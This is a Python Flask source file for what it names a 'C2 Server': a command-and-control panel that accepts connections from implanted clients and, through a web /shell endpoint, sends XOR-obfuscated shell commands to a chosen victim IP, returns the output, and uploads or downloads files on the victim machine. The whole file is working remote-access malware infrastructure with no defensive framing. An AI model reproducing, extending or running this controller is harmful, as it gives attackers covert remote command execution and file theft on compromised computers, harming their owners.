from flask import Flask, render_template, request, jsonify
import socket
import threading
import uuid

app = Flask(__name__)
HOST = '0.0.0.0'
PORT = 5555
KEY = 0x42  # Simple XOR key for encryption/decryption

clients = {}
clients_lock = threading.Lock()

def xor_encrypt_decrypt(data):
    return bytes([b ^ KEY for b in data])

def handle_client(client_socket, address):
    with clients_lock:
        clients[address] = client_socket
    print(f"[+] Connection from {address}")
    try:
        while True:
            # Keep the connection alive, no direct input here
            data = client_socket.recv(1024)
            if not data:
                break
    except Exception as e:
        print(f"[!] Error with client {address}: {e}")
    finally:
        with clients_lock:
            if address in clients:
                del clients[address]
        client_socket.close()
        print(f"[-] Connection closed for {address}")

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Set SO_REUSEADDR to allow immediate reuse of the port
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f"[*] C2 Server listening on {HOST}:{PORT}")

    def accept_clients():
        while True:
            client_socket, address = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, address))
            client_thread.daemon = True
            client_thread.start()

    accept_thread = threading.Thread(target=accept_clients)
    accept_thread.daemon = True
    accept_thread.start()

start_server()

@app.route('/shell', methods=['GET', 'POST'])
def shell():
    if request.method == 'POST':
        cmd = request.json.get('command')
        target_ip = request.json.get('target_ip')
        if not cmd or not target_ip:
            return jsonify({'output': 'Command and target_ip required'}), 400
        with clients_lock:
            client_socket = None
            for addr in clients:
                if addr[0] == target_ip:
                    client_socket = clients[addr]
                    break
        if not client_socket:
            return jsonify({'output': f'Client {target_ip} not connected'})
        try:
            # Check if command is a file transfer command
            if cmd.startswith('upload '):
                # Format: upload <local_path> <remote_path>
                parts = cmd.split(' ', 2)
                if len(parts) < 3:
                    return jsonify({'output': 'Usage: upload <local_path> <remote_path>'})
                local_path, remote_path = parts[1], parts[2]
                try:
                    with open(local_path, 'rb') as f:
                        file_data = f.read()
                    # Send upload command with remote path and file size
                    upload_cmd = f'upload {remote_path} {len(file_data)}'
                    encrypted_cmd = xor_encrypt_decrypt(upload_cmd.encode())
                    client_socket.send(len(encrypted_cmd).to_bytes(4, 'big'))
                    client_socket.sendall(encrypted_cmd)
                    # Send file data
                    client_socket.sendall(file_data)
                    return jsonify({'output': f'File {local_path} uploaded to {remote_path}'})
                except Exception as e:
                    return jsonify({'output': f'Error reading local file: {e}'})
            elif cmd.startswith('download '):
                # Format: download <remote_path> <local_path>
                parts = cmd.split(' ', 2)
                if len(parts) < 3:
                    return jsonify({'output': 'Usage: download <remote_path> <local_path>'})
                remote_path, local_path = parts[1], parts[2]
                # Send download command
                download_cmd = f'download {remote_path}'
                encrypted_cmd = xor_encrypt_decrypt(download_cmd.encode())
                client_socket.send(len(encrypted_cmd).to_bytes(4, 'big'))
                client_socket.sendall(encrypted_cmd)
                # Receive file size
                raw_len = client_socket.recv(4)
                if not raw_len:
                    return jsonify({'output': 'No response from client'})
                file_size = int.from_bytes(raw_len, 'big')
                received_data = b''
                while len(received_data) < file_size:
                    chunk = client_socket.recv(file_size - len(received_data))
                    if not chunk:
                        break
                    received_data += chunk
                # Save to local file
                try:
                    with open(local_path, 'wb') as f:
                        f.write(received_data)
                    return jsonify({'output': f'File downloaded to {local_path}'})
                except Exception as e:
                    return jsonify({'output': f'Error saving file: {e}'})
            else:
                # Normal shell command
                encrypted_cmd = xor_encrypt_decrypt(cmd.encode())
                # Send length of command first
                client_socket.send(len(encrypted_cmd).to_bytes(4, 'big'))
                client_socket.sendall(encrypted_cmd)
                # Receive response length
                raw_len = client_socket.recv(4)
                if not raw_len:
                    return jsonify({'output': 'No response from client'})
                resp_len = int.from_bytes(raw_len, 'big')
                encrypted_resp = b''
                while len(encrypted_resp) < resp_len:
                    chunk = client_socket.recv(resp_len - len(encrypted_resp))
                    if not chunk:
                        break
                    encrypted_resp += chunk
                decrypted_response = xor_encrypt_decrypt(encrypted_resp).decode(errors='ignore')
                return jsonify({'output': decrypted_response})
        except Exception as e:
            return jsonify({'output': f'Error communicating with client: {e}'})
    with clients_lock:
        connected_clients = [addr[0] for addr in clients.keys()]
    return render_template('shell.html', clients=connected_clients)

if __name__ == '__main__':
    app.run(debug=True)
